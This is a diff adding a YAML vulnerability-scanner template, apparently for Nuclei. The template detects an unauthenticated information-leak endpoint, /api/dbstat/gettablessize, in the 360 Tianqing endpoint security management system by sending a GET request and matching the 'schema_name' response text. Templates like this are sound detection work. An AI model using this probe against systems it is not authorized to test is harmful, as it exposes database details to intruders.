@@ -1,0 +1,24 @@
+id: 360-tianqing-gettablessize-unauthorized-access
+
+info:
+  name: 360 新天擎终端安全管理系统存在未授权漏洞
+  author: Ashro
+  description: 360 新天擎终端安全管理系统中，/api/dbstat/gettablessize 文件可能会泄露敏感信息。
+  reference:
+    - https://example.com/reference-to-vulnerability
+  severity: high
+  tags: info-leak
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/dbstat/gettablessize"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "schema_name"
+      - type: status
+        status:
+          - 200
